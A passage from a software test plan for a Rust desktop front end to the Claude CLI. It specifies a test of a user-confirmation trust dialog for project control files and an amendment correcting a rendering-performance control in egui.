10. E11 (new: the panel side of E8 and the dialog; registered here). A project holding `.mcp.json`,
    `.claude/settings.json` (a `hooks` key) and `.rcfd/claude-allow.json` (first list plus `Bash(echo hi)`) when it opens.
    Limits: the folder is pending with exactly those 3 files, all 3 changed, the allow rules exactly the file's, 3 previews
    whose hashes match; sending is refused in the model and opens the dialog, and 0.5 s later no `-p` call is recorded; the
    dialog is drawn with its heading, the 3 paths, "new or changed", `Bash(echo hi)` and the `.mcp.json` hash; "Confirm"
    (`ChatModel::confirm`) gives a confirmed folder, a trust record in the config folder naming `.mcp.json` and nothing at
    `.rcfd/claude-trust.json`; a message then starts exactly one `-p` process. One byte of `.mcp.json` changes; a message
    (the model's state is stale) is refused by the driver, the turn is `Refused`, the folder pending with `changed` exactly
    `.mcp.json`, the dialog open again, still one `-p` process. Control: a project without control files is confirmed at
    open, no dialog, a message starts one process.
11. B9: `parity_assistant_access_known_miss` becomes `parity_assistant_access` (the fake; a new chat's turn finishes with
    the recorded text; one process).
12. Also run, unchanged: every other `rcfd-studio` test and `workspace_graph` (3 tests; `rcfd-studio` at 9 depends on
    `rcfd-claude` at 2). `rcfd-claude` is not changed by this part.

## Amendment 4 (2026-10-28, integration part, E10 control set-up defect, before the corrected run)

Run 1 (the registered run of Amendment 3, commit 0d85f78: `cargo test --release -p rcfd-studio -- --test-threads 1`):
every chat check passed except **the E10 negative control, which did not fail as required**: median 2.303 ms (min 0.469,
max 17.231) with the whole feed drawn as one label. Cause, in the control's set-up and not in the panel: egui 0.36's galley
cache splits a text that contains `\n` into paragraphs and caches each one (`epaint` 0.36.2, `text/fonts.rs`,
`should_cache_each_paragraph_individually` and `layout_each_paragraph_individually`), so a text that grows at its end is
laid out again only in its last paragraph. The feed's text has a `\n` between items and in the model's text, so the control
did not lay out "the whole transcript as one text each frame", which is what the ADR's control names. Because the first
failing test binary stopped `cargo test`, the test binaries after `chat_e` did not run in run 1.

Correction (limit and positive check unchanged): `Switches::whole_text` draws the whole feed as one text without line
breaks (each `\n` replaced by a space, items separated by `" | "`), which egui lays out as a single paragraph whenever it
changes, as every frame of the streaming turn does. The corrected run is the whole crate again, with `--no-fail-fast` so
that every test binary runs. Run 1's values of the other checks are reported in the addendum as run 1; the corrected run's
values are the registered results.
